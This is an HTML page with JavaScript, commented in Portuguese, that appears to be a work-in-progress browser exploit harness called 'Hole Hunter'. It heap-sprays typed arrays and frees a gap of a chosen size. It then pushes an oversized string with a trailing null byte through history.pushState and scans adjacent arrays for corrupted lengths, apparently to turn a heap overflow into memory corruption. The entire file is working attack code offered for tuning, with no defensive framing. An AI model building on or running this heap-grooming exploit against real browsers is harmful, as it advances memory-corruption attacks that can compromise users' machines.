<!DOCTYPE html>
<html>
<head>
    <title>Hole Hunter: The Math Fix</title>
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        .log { border: 1px solid #004400; height: 350px; overflow-y: scroll; padding: 10px; background: #001100; color: #fff; margin-bottom: 15px;}
        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
        button { 
            padding: 15px; font-weight: bold; cursor: pointer; 
            background: #002200; color: #0f0; border: 1px solid #005500; 
            font-size: 16px; 
        }
        button:hover { background: #0f0; color: #000; }
        .highlight { color: yellow; font-weight: bold; }
    </style>
</head>
<body>
    <h1>HOLE HUNTER</h1>
    <p>Base Fixa: 709522 | Overflow: 0x00 (Byte Seguro)</p>
    <p>Teoria: O buraco de 168 era pequeno demais. Buscando o tamanho ideal (172-180).</p>

    <div id="logger" class="log">Selecione um tamanho de buraco...</div>

    <div class="grid">
        <button onclick="runTest(172)">Testar 172</button>
        <button onclick="runTest(173)">Testar 173 (Exato?)</button>
        <button onclick="runTest(174)">Testar 174 (Folgado?)</button>
        <button onclick="runTest(175)">Testar 175</button>
        <button onclick="runTest(176)">Testar 176</button>
        <button onclick="runTest(177)">Testar 177</button>
        <button onclick="runTest(178)">Testar 178</button>
        <button onclick="runTest(179)">Testar 179</button>
    </div>

    <script>
        const logger = document.getElementById('logger');
        const BASE_SIZE = 709522; // Sua descoberta
        const MAGIC_NUM = 0x41414141;
        const SPRAY_SIZE = 8000;

        var spray = [];

        function log(msg, type) {
            const d = document.createElement('div');
            d.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            if(type) d.className = type;
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        async function runTest(holeSize) {
            log("---------------------------------------");
            log(`TESTANDO BURACO: ${holeSize} blocos`, 'highlight');
            
            // 1. Limpeza
            spray = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 200));
            spray = [];

            // 2. Spray
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(1024);
                arr[0] = MAGIC_NUM;
                arr[1] = i;
                spray.push(arr);
            }

            // 3. Abrir Buraco Variável
            let center = 4000;
            for(let i=0; i < holeSize; i++) {
                spray[center + i] = null;
            }

            log("Aguardando GC...");
            await new Promise(r => setTimeout(r, 800));

            try {
                // 4. Payload
                let base = new Array(BASE_SIZE + 1).join('A');
                
                // Usamos byte 0x00 para não assustar o Header se cair certo
                // Se isso não crashar, tentamos mudar para 0x01 ou Length depois
                let overflow = "\x00"; 
                
                let payload = base + overflow;

                history.pushState({}, "pwn_" + holeSize + "_" + Date.now(), payload);
                
                checkCorruption(holeSize, center);

            } catch(e) {
                log("ERRO: " + e.message);
            }
        }

        function checkCorruption(holeUsed, startIdx) {
            let found = false;
            // Verifica vizinhos
            let limit = startIdx + holeUsed + 30; 

            for(let i = startIdx + holeUsed; i < limit; i++) {
                if (i >= spray.length) break;
                let arr = spray[i];
                if(arr) {
                    if(arr.length !== 1024) {
                        found = true;
                        document.body.style.background = "#0f0";
                        alert(`SUCESSO! Buraco ${holeUsed} funcionou! Length: ${arr.length}`);
                        return;
                    }
                    if(arr[0] !== MAGIC_NUM) {
                        found = true;
                        log(`DADO ALTERADO no Index ${i} (Buraco ${holeUsed})`, 'highlight');
                    }
                }
            }
            if(!found) log(`Buraco ${holeUsed}: Sem efeito (Estável). Tente outro tamanho.`);
        }
    </script>
</body>
</html>
